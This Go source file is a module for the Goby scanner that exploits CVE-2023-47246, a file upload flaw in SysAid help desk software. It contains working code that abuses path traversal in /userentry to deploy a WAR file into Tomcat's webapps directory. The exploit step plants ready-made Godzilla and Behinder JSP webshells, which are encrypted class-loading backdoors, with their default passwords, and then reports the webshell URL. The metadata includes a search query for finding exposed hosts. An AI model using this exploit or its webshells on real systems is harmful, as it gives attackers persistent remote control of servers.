package exploits

import (
	"archive/zip"
	"bytes"
	"compress/zlib"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "SysAid userentry file upload vulnerability (CVE-2023-47246)",
    "Description": "<p>SysAid is an information technology (IT) service management and help desk solution designed to help organizations more effectively manage their IT infrastructure, help desk support and user needs. SysAid provides a series of functions, including fault reporting, asset management, problem management, change management, knowledge base, automated workflow, etc., to help enterprises improve the efficiency and quality of IT services.</p><p>SysAid has a file upload vulnerability in userentry. An attacker can use the file upload vulnerability to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Product": "SysAid-Help-Desk",
    "Homepage": "https://www.sysaid.com/",
    "DisclosureDate": "2023-11-10",
    "PostTime": "2023-11-14",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "body=\"sysaid-logo-dark-green.png\" || title=\"SysAid Help Desk Software\" || body=\"Help Desk software <a href=\\\"http://www.sysaid.com\\\">by SysAid</a>\"",
    "GobyQuery": "body=\"sysaid-logo-dark-green.png\" || title=\"SysAid Help Desk Software\" || body=\"Help Desk software <a href=\\\"http://www.sysaid.com\\\">by SysAid</a>\"",
    "Level": "3",
    "Impact": "<p>SysAid has a file upload vulnerability in userentry. An attacker can use the file upload vulnerability to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Recommendation": "<p>The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification\">https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification</a></p>",
    "References": [
        "https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "userfiles.war",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-47246"
    ],
    "CNNVD": [
        "CNNVD-202311-840"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "SysAid userentry 文件上传漏洞（CVE-2023-47246）",
            "Product": "SysAid-Help-Desk",
            "Description": "<p>SysAid 是一种信息技术（IT）服务管理和帮助台解决方案，旨在帮助组织更有效地管理其IT基础设施、服务台支持和用户需求。SysAid 提供了一系列的功能，包括故障报告、资产管理、问题管理、变更管理、知识库、自动化工作流程等，以帮助企业提高IT服务的效率和质量。<br></p><p>SysAid 在 userentry 存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "Recommendation": "<p>官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification\" target=\"_blank\">https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification</a><br></p>",
            "Impact": "<p>SysAid 在 userentry 存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "SysAid userentry file upload vulnerability (CVE-2023-47246)",
            "Product": "SysAid-Help-Desk",
            "Description": "<p>SysAid is an information technology (IT) service management and help desk solution designed to help organizations more effectively manage their IT infrastructure, help desk support and user needs. SysAid provides a series of functions, including fault reporting, asset management, problem management, change management, knowledge base, automated workflow, etc., to help enterprises improve the efficiency and quality of IT services.</p><p>SysAid has a file upload vulnerability in userentry. An attacker can use the file upload vulnerability to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
            "Recommendation": "<p>The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification\" target=\"_blank\">https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification</a><br></p>",
            "Impact": "<p>SysAid has a file upload vulnerability in userentry. An attacker can use the file upload vulnerability to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10871"
}`

	// 构建 war 包
	buildWarFlag4nKf6u := func(filename, content string) ([]byte, error) {
		var buf bytes.Buffer
		zipWriter := zip.NewWriter(&buf)
		fileWriter, err := zipWriter.Create(filename)
		_, err = fileWriter.Write([]byte(content))
		if err != nil {
			return nil, err
		}
		err = zipWriter.Close()
		if err != nil {
			return nil, err
		}
		return buf.Bytes(), nil
	}

	// 构建 zip 数据（二次归档 war）
	buildZipFlag4nKf6u := func(warName, filename, content string) ([]byte, error) {
		data, err := buildWarFlag4nKf6u(filename, content)
		if err != nil {
			return nil, err
		}
		var buf bytes.Buffer
		zipWriter := zip.NewWriter(&buf)
		fileWriter, err := zipWriter.Create(warName)
		_, err = fileWriter.Write(data)
		if err != nil {
			return nil, err
		}
		err = zipWriter.Close()
		if err != nil {
			return nil, err
		}
		return buf.Bytes(), nil
	}

	uploadFiledG38bdk := func(hostInfo *httpclient.FixUrl, warName, filename, content string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(warName, `.war`) {
			warName = warName + `.war`
		}
		data, err := buildZipFlag4nKf6u(warName, filename, content)
		if err != nil {
			return nil, err
		}
		uploadConfig := httpclient.NewPostRequestConfig("/userentry?accountId=../../../tomcat/webapps&symbolName=LDAP_REFRESH_")
		uploadConfig.VerifyTls = false
		uploadConfig.FollowRedirect = false
		uploadConfig.Header.Store(`Content-Type`, `application/octet-stream`)
		var compressedData bytes.Buffer
		w := zlib.NewWriter(&compressedData)
		w.Write(data)
		w.Close()
		uploadConfig.Data = string(compressedData.Bytes())
		return httpclient.DoHttpRequest(hostInfo, uploadConfig)
	}

	checkFileG38bdk := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		checkConfig := httpclient.NewGetRequestConfig(filename)
		checkConfig.VerifyTls = false
		checkConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			warName := goutils.RandomHexString(5)
			checkStr := goutils.RandomHexString(10)
			resp, err := uploadFiledG38bdk(hostInfo, warName+`.war`, `index.jsp`, `<%
	out.println("`+checkStr+`");
    String appPath = new java.io.File(application.getRealPath(request.getServletPath())).getParentFile().getParent();
    new java.io.File(appPath+"/LDAP_REFRESH_").delete();
    new java.io.File(appPath+"/`+warName+`.war").delete();
%>`)
			// 连接错误或者是状态吗非200
			if err != nil || (resp != nil && resp.StatusCode != 200) {
				return false
			}
			for i := 0; i < 15; i++ {
				if resp, err := checkFileG38bdk(hostInfo, `/`+warName+`/index.jsp`); err != nil {
					return false
				} else if resp != nil && strings.Contains(resp.RawBody, checkStr) {
					return true
				}
				time.Sleep(time.Second)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			var content string
			filename := `userfiles.war`
			if attackType == "godzilla" {
				content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){} %>`
			} else if attackType == "behinder" {
				content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			} else if attackType == "custom" {
				filename = goutils.B2S(ss.Params["filename"])
				content = goutils.B2S(ss.Params["content"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			resp, err := uploadFiledG38bdk(expResult.HostInfo, filename, `index.jsp`, content)
			if err != nil {
				expResult.Output = err.Error()
			} else if resp.StatusCode == 200 {
				shellPath := `/` + strings.ReplaceAll(filename, `.war`, ``) + `/index.jsp`
				for i := 0; i < 10; i++ {
					if checkResp, checkErr := checkFileG38bdk(expResult.HostInfo, shellPath); err != nil {
						expResult.Output = checkErr.Error()
						break
					} else if checkResp.StatusCode == 200 || checkResp.StatusCode == 500 {
						expResult.Success = true
						expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + shellPath + "\n"
						if attackType == "behinder" {
							expResult.Output += "Password: rebeyond\n"
							expResult.Output += "WebShell tool: Behinder v3.0\n"
						} else if attackType == "godzilla" {
							expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
							expResult.Output += "WebShell tool: Godzilla v4.1\n"
						}
						expResult.Output += "Webshell type: jsp"
						break
					}
					time.Sleep(time.Second)
				}
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
